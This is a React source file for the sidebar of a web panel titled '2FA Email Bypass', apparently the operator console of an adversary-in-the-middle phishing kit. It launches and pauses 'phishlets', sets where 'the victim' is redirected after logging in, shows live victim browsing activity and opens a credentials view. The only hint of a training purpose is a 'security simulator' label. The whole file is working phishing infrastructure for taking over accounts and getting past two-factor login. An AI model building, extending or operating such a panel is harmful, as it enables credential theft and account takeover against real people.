import { useState, useEffect, useRef } from "react";
import { createPortal } from "react-dom";
import axios from "axios";
import { useAuth } from "../context/AuthContext";
import { phishletUrl } from "../hooks/phishletUrl";
import authHeaders from "../utils/authHeaders";
import CredentialsModal from "./CredentialsModal";

const BASE = import.meta.env.VITE_API_URL || "";

const ITEMS = [
  { label: "View Logs", endpoint: "/api/logs", icon: "terminal" },
];

function NavIcon({ name, className = "w-4 h-4" }) {
  const icons = {
    server: (
      <svg className={className} fill="none" stroke="currentColor" viewBox="0 0 24 24">
        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 12h14M5 12a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v4a2 2 0 01-2 2M5 12a2 2 0 00-2 2v4a2 2 0 002 2h14a2 2 0 002-2v-4a2 2 0 00-2-2m-2-4h.01M17 16h.01" />
      </svg>
    ),
    settings: (
      <svg className={className} fill="none" stroke="currentColor" viewBox="0 0 24 24">
        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" />
        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
      </svg>
    ),
    terminal: (
      <svg className={className} fill="none" stroke="currentColor" viewBox="0 0 24 24">
        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" />
      </svg>
    ),
    key: (
      <svg className={className} fill="none" stroke="currentColor" viewBox="0 0 24 24">
        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" />
      </svg>
    ),
    target: (
      <svg className={className} fill="none" stroke="currentColor" viewBox="0 0 24 24">
        <circle cx="12" cy="12" r="10" strokeWidth={2} />
        <circle cx="12" cy="12" r="6" strokeWidth={2} />
        <circle cx="12" cy="12" r="2" fill="currentColor" strokeWidth={0} />
      </svg>
    ),
    browser: (
      <svg className={className} fill="none" stroke="currentColor" viewBox="0 0 24 24">
        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9" />
      </svg>
    ),
    tools: (
      <svg className={className} fill="none" stroke="currentColor" viewBox="0 0 24 24">
        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" />
        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
      </svg>
    ),
    logout: (
      <svg className={className} fill="none" stroke="currentColor" viewBox="0 0 24 24">
        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" />
      </svg>
    ),
  };
  return icons[name] || null;
}

function SidebarIcon({ icon, className = "w-4 h-4" }) {
  if (icon.startsWith("svg:")) {
    return null;
  }
  return <NavIcon name={icon} className={className} />;
}

function PhishletSettingsModal({ phishlet, onClose, onRun }) {
  const [redirectUrl, setRedirectUrl] = useState("");
  const [visits, setVisits] = useState([]);
  const [saving, setSaving] = useState(false);
  const [saveStatus, setSaveStatus] = useState("");
  const [restarting, setRestarting] = useState(false);

  useEffect(() => {
    axios
      .get(
        `${BASE}/api/phishlets/redirect-url?key=${encodeURIComponent(phishlet.key)}`,
      )
      .then((res) => setRedirectUrl(res.data.url || ""))
      .catch(() => setRedirectUrl(""));
  }, [phishlet.key]);

  useEffect(() => {
    let cancelled = false;
    let timer = null;
    let interval = 3000;
    const BASE_INTERVAL = 3000;
    const MAX_INTERVAL = 24000;

    function fetchVisits() {
      if (cancelled) return;
      axios
        .get(`${BASE}/api/phishlets/visits`, {
          params: { key: phishlet.key, limit: 20 },
          headers: authHeaders(),
        })
        .then((res) => {
          if (cancelled) return;
          setVisits(res.data.visits || []);
          interval = BASE_INTERVAL;
          timer = setTimeout(fetchVisits, interval);
        })
        .catch(() => {
          if (cancelled) return;
          interval = Math.min(interval * 2, MAX_INTERVAL);
          timer = setTimeout(fetchVisits, interval);
        });
    }
    fetchVisits();
    return () => {
      cancelled = true;
      if (timer) clearTimeout(timer);
    };
  }, [phishlet.key]);

  function handleSave() {
    setSaving(true);
    setSaveStatus("");
    axios
      .put(
        `${BASE}/api/phishlets/${phishlet.key}/redirect-url`,
        { url: redirectUrl },
        { headers: authHeaders() },
      )
      .then(() => {
        setSaveStatus("Saved");
        setTimeout(() => setSaveStatus(""), 2000);
      })
      .catch((err) => setSaveStatus(err.response?.data?.detail || err.message))
      .finally(() => setSaving(false));
  }

  function handleRestart() {
    setRestarting(true);
    axios
      .post(
        `${BASE}/api/phishlets/${phishlet.key}/restart`,
        {},
        { headers: authHeaders() },
      )
      .then((res) => {
        onRun(`Restart ${phishlet.label}`, "/api/phishlets/launch", {
          key: phishlet.key,
        });
        setSaveStatus(res.data?.message || "Restarted");
        setTimeout(() => setSaveStatus(""), 2000);
      })
      .catch((err) => setSaveStatus(err.response?.data?.detail || err.message))
      .finally(() => setRestarting(false));
  }

  return (
    <div
      className="fixed inset-0 z-50 bg-black/70 flex items-center justify-center p-4"
      onClick={onClose}
    >
      <div
        className="bg-gray-900 border border-gray-700 rounded-lg w-full max-w-lg sm:max-w-2xl max-h-[90vh] flex flex-col"
        onClick={(e) => e.stopPropagation()}
      >
        <div className="flex items-center justify-between px-4 sm:px-5 py-3 border-b border-gray-800">
          <h2 className="text-xs sm:text-sm font-bold text-yellow-300 tracking-wide">
            {phishlet.label} Phishlet Settings
          </h2>
          <button
            onClick={onClose}
            className="text-gray-500 hover:text-red-400 text-lg leading-none"
          >
            ×
          </button>
        </div>

        <div className="px-4 sm:px-5 py-4 space-y-4 overflow-y-auto">
          <div>
            <label className="block text-xs text-gray-400 mb-1">
              Redirect URL (where the victim is sent after successful login)
            </label>
            <div className="flex gap-2">
              <input
                type="text"
                value={redirectUrl}
                onChange={(e) => setRedirectUrl(e.target.value)}
                placeholder="https://example.com"
                className="flex-1 bg-gray-800 border border-gray-700 rounded px-3 py-2 text-xs text-gray-200 focus:outline-none focus:border-green-500"
              />
              <button
                onClick={handleSave}
                disabled={saving}
                className="px-4 py-2 text-xs rounded bg-green-700 text-green-200 hover:bg-green-600 transition disabled:opacity-40"
              >
                {saving ? "Saving..." : "Save"}
              </button>
            </div>
            {saveStatus && (
              <p
                className={`mt-1 text-[10px] ${
                  saveStatus === "Saved" ? "text-green-400" : "text-red-400"
                }`}
              >
                {saveStatus}
              </p>
            )}
            <p className="mt-1 text-[10px] text-gray-600">
              Leave empty to disable the post-login redirect.
            </p>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={handleRestart}
              disabled={restarting}
              className="px-4 py-2 text-xs rounded bg-blue-700 text-blue-200 hover:bg-blue-600 transition disabled:opacity-40"
            >
              {restarting
                ? "Restarting..."
                : `Restart ${phishlet.label} Container`}
            </button>
            <span className="text-[10px] text-gray-500">
              (picks up the new addon in already-running containers)
            </span>
          </div>

          <div>
            <div className="flex items-center justify-between mb-2">
              <h3 className="text-xs font-semibold text-gray-300">
                Current victim activity
              </h3>
              <span className="text-[10px] text-gray-500">
                auto-refreshes every 3s
              </span>
            </div>
            <div className="border border-gray-800 rounded bg-gray-950 max-h-64 overflow-y-auto">
              {visits.length === 0 ? (
                <p className="px-3 py-4 text-xs text-gray-500 text-center">
                  no activity yet
                </p>
              ) : (
                <table className="w-full text-xs">
                  <thead className="sticky top-0 bg-gray-900 border-b border-gray-800">
                    <tr className="text-left text-gray-500">
                      <th className="px-3 py-1.5 font-normal w-28 sm:w-40">
                        Time
                      </th>
                      <th className="px-3 py-1.5 font-normal">URL</th>
                    </tr>
                  </thead>
                  <tbody>
                    {visits.map((v, i) => (
                      <tr
                        key={i}
                        className="border-b border-gray-800 last:border-0 hover:bg-gray-900"
                      >
                        <td className="px-3 py-1.5 text-gray-500 whitespace-nowrap text-[11px]">
                          {v.timestamp
                            ? new Date(v.timestamp).toLocaleTimeString()
                            : "-"}
                        </td>
                        <td className="px-3 py-1.5 text-gray-300 break-all text-[11px]">
                          {v.current_url}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default function Sidebar({
  onRun,
  loading,
  onOpenBrowser,
  onContainerRemovedByKey,
  onPauseToggle,
  onClose,
}) {
  const { user, logout } = useAuth();
  const [showPhishlets, setShowPhishlets] = useState(false);
  const [phishlets, setPhishlets] = useState([]);
  const [phishletFetching, setPhishletFetching] = useState(false);
  const [phishletError, setPhishletError] = useState("");
  const [settingsPhishlet, setSettingsPhishlet] = useState(null);
  const [pausingPhishlet, setPausingPhishlet] = useState(null);
  const [pauseUrl, setPauseUrl] = useState("");
  const [pausing, setPausing] = useState(false);
  const [showCredentials, setShowCredentials] = useState(false);
  const [collapsed, setCollapsed] = useState(false);
  const phishletRef = useRef(null);

  useEffect(() => {
    if (!showPhishlets) return;
    setPhishletFetching(true);
    setPhishletError("");
    axios
      .get(`${BASE}/api/phishlets`, { headers: authHeaders() })
      .then((res) => {
        setPhishlets(res.data.phishlets || []);
        if (res.data.error) setPhishletError(res.data.error);
      })
      .catch((err) => {
        setPhishlets([]);
        setPhishletError(err.message);
      })
      .finally(() => setPhishletFetching(false));
  }, [showPhishlets]);

  useEffect(() => {
    function handleClick(e) {
      if (phishletRef.current && !phishletRef.current.contains(e.target)) {
        setShowPhishlets(false);
      }
    }
    document.addEventListener("mousedown", handleClick);
    return () => document.removeEventListener("mousedown", handleClick);
  }, []);

  const handlePhishletLaunch = (key, label, port) => {
    setShowPhishlets(false);
    const p = onRun(`Launch ${label}`, `/api/phishlets/launch`, { key });
    if (p) {
      p.then((data) => {
        if (data && data.status === "success") {
          setTimeout(() => {
              onOpenBrowser(
              phishletUrl(key, port),
              label,
              key,
            );
          }, 4000);
        }
      });
    }
  };

  const handlePhishletOpen = (url, label, key) => {
    setShowPhishlets(false);
    onOpenBrowser(url, label, key);
  };

  const handlePhishletRemove = (name, label, port, key) => {
    setShowPhishlets(false);
    onRun(`Remove ${label}`, `/api/containers/remove`, { name }).then(() => {
      onContainerRemovedByKey(key);
      axios
        .post(
          `${BASE}/api/phishlets/${key}/unpause`,
          {},
          { headers: authHeaders() },
        )
        .catch(() => {});
    });
  };

  const handlePhishletPause = (key, label) => {
    setPausingPhishlet({ key, label });
    setPauseUrl("");
  };

  const confirmPause = () => {
    if (!pausingPhishlet || !pauseUrl.trim()) return;
    setPausing(true);
    axios
      .post(
        `${BASE}/api/phishlets/${pausingPhishlet.key}/pause`,
        { redirect_url: pauseUrl.trim() },
        { headers: authHeaders() },
      )
      .then(() => {
        onPauseToggle(pausingPhishlet.key, pauseUrl.trim());
        setPausingPhishlet(null);
        setPauseUrl("");
        setShowPhishlets(true);
      })
      .catch((err) => {
        alert(err.response?.data?.detail || err.message);
      })
      .finally(() => setPausing(false));
  };

  const handlePhishletUnpause = (key, label, port) => {
    setShowPhishlets(false);
    axios
      .post(
        `${BASE}/api/phishlets/${key}/unpause`,
        {},
        { headers: authHeaders() },
      )
      .then(() => {
        const originalUrl = phishletUrl(key, port);
        onPauseToggle(key, originalUrl);
        setShowPhishlets(true);
      })
      .catch((err) => {
        alert(err.response?.data?.detail || err.message);
      });
  };

  const handlePhishletToggleKiosk = (key, label) => {
    setShowPhishlets(false);
    onRun(
      `Toggle Kiosk ${label}`,
      `/api/phishlets/${key}/toggle-kiosk`,
      {},
    ).then(() => {
      setPhishletFetching(true);
      axios
        .get(`${BASE}/api/phishlets`, { headers: authHeaders() })
        .then((res) => setPhishlets(res.data.phishlets || []))
        .catch(() => {})
        .finally(() => setPhishletFetching(false));
    });
  };

  const handleRebuildImage = () => {
    onRun("Rebuild Firefox Image", "/api/phishlets/rebuild-image", {});
  };

  return (
    <aside className={`bg-gray-900 border-r border-gray-800 flex flex-col shrink-0 h-full transition-all duration-200 ${collapsed ? 'w-14' : 'w-56'}`}>
      <div className={`px-4 py-5 border-b border-gray-800 flex items-center ${collapsed ? 'justify-center' : 'justify-between'}`}>
        {!collapsed && (
          <div>
            <h1 className="text-lg font-bold text-green-400 tracking-widest drop-shadow-[0_0_6px_rgba(34,197,94,0.4)]">
              {import.meta.env.VITE_APP_NAME || "2FA Email Bypass"}
            </h1>
            <p className="text-[10px] text-gray-600 mt-0.5">
              v1.0 — security simulator
            </p>
          </div>
        )}
        <div className="flex items-center gap-1">
          <button
            onClick={() => setCollapsed(!collapsed)}
            className="text-gray-500 hover:text-green-400 transition p-1"
            title={collapsed ? "Expand sidebar" : "Collapse sidebar"}
          >
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d={collapsed ? "M13 5l7 7-7 7M5 5l7 7-7 7" : "M11 19l-7-7 7-7m8 14l-7-7 7-7"} />
            </svg>
          </button>
          {onClose && (
            <button
              onClick={onClose}
              className="lg:hidden text-gray-500 hover:text-green-400 transition p-1"
            >
              <svg
                className="w-5 h-5"
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={2}
                  d="M6 18L18 6M6 6l12 12"
                />
              </svg>
            </button>
          )}
        </div>
      </div>

      <nav className={`flex-1 overflow-y-auto ${collapsed ? 'p-1 space-y-1' : 'p-3 space-y-1'}`}>
        {ITEMS.map((item) => (
          <button
            key={item.label}
            onClick={() => onRun(item.label, item.endpoint)}
            disabled={loading[item.label]}
            className={`w-full flex items-center gap-3 px-3 py-2.5 rounded text-sm text-gray-400 hover:text-green-300 hover:bg-gray-800 transition disabled:opacity-40 disabled:cursor-not-allowed ${collapsed ? 'justify-center' : ''}`}
            title={collapsed ? item.label : ''}
          >
            <NavIcon name={item.icon} className="w-4 h-4" />
            {!collapsed && <span>{loading[item.label] ? `${item.label}...` : item.label}</span>}
          </button>
        ))}

        <button
          onClick={() => setShowCredentials(true)}
          className={`w-full flex items-center gap-3 px-3 py-2.5 rounded text-sm text-gray-400 hover:text-yellow-300 hover:bg-gray-800 transition ${collapsed ? 'justify-center' : ''}`}
          title={collapsed ? 'Credentials' : ''}
        >
          <NavIcon name="key" className="w-4 h-4" />
          {!collapsed && <span>Credentials</span>}
        </button>

        <div ref={phishletRef} className="relative">
          <button
            onClick={() => setShowPhishlets((v) => !v)}
            className={`w-full flex items-center gap-3 px-3 py-2.5 rounded text-sm text-gray-400 hover:text-yellow-300 hover:bg-gray-800 transition ${collapsed ? 'justify-center' : ''}`}
            title={collapsed ? 'Phishlets' : ''}
          >
            <NavIcon name="target" className="w-4 h-4" />
            {!collapsed && <span>Phishlets</span>}
          </button>

          {showPhishlets && (
            <div className="absolute left-0 right-0 top-full mt-1 bg-gray-800 border border-gray-700 rounded-lg shadow-lg z-10 max-h-72 overflow-y-auto">
              {phishletFetching ? (
                <p className="px-3 py-2 text-xs text-gray-500">loading...</p>
              ) : phishletError ? (
                <p className="px-3 py-2 text-xs text-red-400">
                  {phishletError}
                </p>
              ) : phishlets.length === 0 ? (
                <p className="px-3 py-2 text-xs text-gray-500">
                  no phishlets configured
                </p>
              ) : (
                phishlets.map((p) => (
                  <div
                    key={p.key}
                    className="px-3 py-2 border-b border-gray-700 last:border-0"
                  >
                    <div className="flex items-center justify-between mb-1">
                      <span className="text-xs font-medium text-gray-200">
                        <span className={`w-2 h-2 rounded-full ${p.running ? (p.paused ? 'bg-yellow-500' : 'bg-green-500') : 'bg-red-500'} ${p.paused ? 'ml-1' : ''}`} />

                        {p.label}
                      </span>
                    </div>
                    <div className="flex items-center gap-1.5 flex-wrap">
                      {!p.running ? (
                        <button
                          onClick={() =>
                            handlePhishletLaunch(p.key, p.label, p.port)
                          }
                          className="text-[10px] px-2 py-0.5 rounded bg-green-700 text-green-200 hover:bg-green-600 transition"
                        >
                          Launch
                        </button>
                      ) : (
                        <>
                          <button
                            onClick={() =>
                              handlePhishletOpen(
                                phishletUrl(p.key, p.port),
                                p.label,
                                p.key,
                              )
                            }
                            className="text-[10px] px-2 py-0.5 rounded bg-blue-700 text-blue-200 hover:bg-blue-600 transition"
                          >
                            Open
                          </button>
                          {p.paused ? (
                            <button
                              onClick={() =>
                                handlePhishletUnpause(p.key, p.label, p.port)
                              }
                              className="text-[10px] px-2 py-0.5 rounded bg-yellow-700 text-yellow-200 hover:bg-yellow-600 transition"
                            >
                              Unpause
                            </button>
                          ) : (
                            <button
                              onClick={() =>
                                handlePhishletPause(p.key, p.label)
                              }
                              className="text-[10px] px-2 py-0.5 rounded bg-amber-700 text-amber-200 hover:bg-amber-600 transition"
                            >
                              Pause
                            </button>
                          )}
                          <button
                            onClick={() =>
                              handlePhishletRemove(
                                p.name,
                                p.label,
                                p.port,
                                p.key,
                              )
                            }
                            className="text-[10px] px-2 py-0.5 rounded bg-red-800 text-red-200 hover:bg-red-700 transition"
                          >
                            Remove
                          </button>
                          <button
                            onClick={() =>
                              handlePhishletToggleKiosk(p.key, p.label)
                            }
                            title={
                              p.kiosk
                                ? "Kiosk ON"
                                : "Kiosk OFF"
                            }
                            className={`text-[10px] px-2 py-0.5 rounded transition flex items-center gap-1 ${
                              p.kiosk
                                ? "bg-purple-700 text-purple-200 hover:bg-purple-600"
                                : "bg-gray-700 text-gray-200 hover:bg-gray-600"
                            }`}
                          >
                            <NavIcon name="browser" className="w-3 h-3" />
                            {p.kiosk ? "Kiosk" : "Toolbar"}
                          </button>
                        </>
                      )}
                      <button
                        onClick={() => setSettingsPhishlet(p)}
                        title="Settings"
                        className="text-[10px] px-2 py-0.5 rounded bg-gray-700 text-gray-200 hover:bg-gray-600 transition"
                      >
                        <NavIcon name="settings" className="w-3 h-3" />
                      </button>
                    </div>
                  </div>
                ))
              )}
            </div>
          )}
        </div>

        <button
          onClick={() =>
            onOpenBrowser(
              `http://${import.meta.env.VITE_VPS_IP || "127.0.0.1"}:5800`,
              "Firefox",
            )
          }
          className={`w-full flex items-center gap-3 px-3 py-2.5 rounded text-sm text-gray-400 hover:text-green-300 hover:bg-gray-800 transition ${collapsed ? 'justify-center' : ''}`}
          title={collapsed ? 'Open Firefox' : ''}
        >
          <NavIcon name="browser" className="w-4 h-4" />
          {!collapsed && <span>Open Firefox</span>}
        </button>

        <button
          onClick={handleRebuildImage}
          disabled={loading["Rebuild Firefox Image"]}
          className={`w-full flex items-center gap-3 px-3 py-2.5 rounded text-sm text-gray-400 hover:text-orange-300 hover:bg-gray-800 transition disabled:opacity-40 disabled:cursor-not-allowed ${collapsed ? 'justify-center' : ''}`}
          title={collapsed ? 'Rebuild Image' : ''}
        >
          <NavIcon name="tools" className="w-4 h-4" />
          {!collapsed && (
            <span>
              {loading["Rebuild Firefox Image"]
                ? "Rebuilding..."
                : "Rebuild"}
            </span>
          )}
        </button>
      </nav>

      <div className={`border-t border-gray-800 ${collapsed ? 'p-2' : 'p-3 space-y-2'}`}>
        {!collapsed && (
          <p className="text-xs text-gray-600 truncate">
            {user?.name || user?.email}
          </p>
        )}
        <button
          onClick={logout}
          className={`w-full flex items-center gap-2 px-2 py-2 rounded text-xs text-red-500 hover:text-red-400 transition ${collapsed ? 'justify-center' : ''}`}
          title={collapsed ? 'logout' : ''}
        >
          <NavIcon name="logout" className="w-4 h-4" />
          {!collapsed && <span>logout</span>}
        </button>
      </div>

      {createPortal(
        settingsPhishlet && (
          <PhishletSettingsModal
            phishlet={settingsPhishlet}
            onClose={() => setSettingsPhishlet(null)}
            onRun={onRun}
          />
        ),
        document.body,
      )}

      {createPortal(
        pausingPhishlet && (
          <div
            className="fixed inset-0 z-50 bg-black/70 flex items-center justify-center p-4"
            onClick={() => setPausingPhishlet(null)}
          >
            <div
              className="bg-gray-900 border border-gray-700 rounded-lg w-full max-w-sm"
              onClick={(e) => e.stopPropagation()}
            >
              <div className="flex items-center justify-between px-4 py-3 border-b border-gray-800">
                <h2 className="text-sm font-bold text-amber-300">
                  Pause {pausingPhishlet.label}
                </h2>
                <button
                  onClick={() => setPausingPhishlet(null)}
                  className="text-gray-500 hover:text-red-400 text-lg leading-none"
                >
                  ×
                </button>
              </div>
              <div className="px-4 py-4 space-y-3">
                <p className="text-xs text-gray-400">
                  All visitors will be redirected to this URL instead of the
                  phishlet page.
                </p>
                <input
                  type="text"
                  value={pauseUrl}
                  onChange={(e) => setPauseUrl(e.target.value)}
                  placeholder="https://example.com"
                  className="w-full bg-gray-800 border border-gray-700 rounded px-3 py-2 text-xs text-gray-200 focus:outline-none focus:border-amber-500"
                  autoFocus
                  onKeyDown={(e) => {
                    if (e.key === "Enter") confirmPause();
                  }}
                />
                <div className="flex gap-2 justify-end">
                  <button
                    onClick={() => setPausingPhishlet(null)}
                    className="px-3 py-1.5 text-xs rounded bg-gray-700 text-gray-300 hover:bg-gray-600 transition"
                  >
                    Cancel
                  </button>
                  <button
                    onClick={confirmPause}
                    disabled={pausing || !pauseUrl.trim()}
                    className="px-3 py-1.5 text-xs rounded bg-amber-700 text-amber-100 hover:bg-amber-600 transition disabled:opacity-40"
                  >
                    {pausing ? "Pausing..." : "Pause"}
                  </button>
                </div>
              </div>
            </div>
          </div>
        ),
        document.body,
      )}

      {createPortal(
        showCredentials && (
          <CredentialsModal onClose={() => setShowCredentials(false)} />
        ),
        document.body,
      )}
    </aside>
  );
}
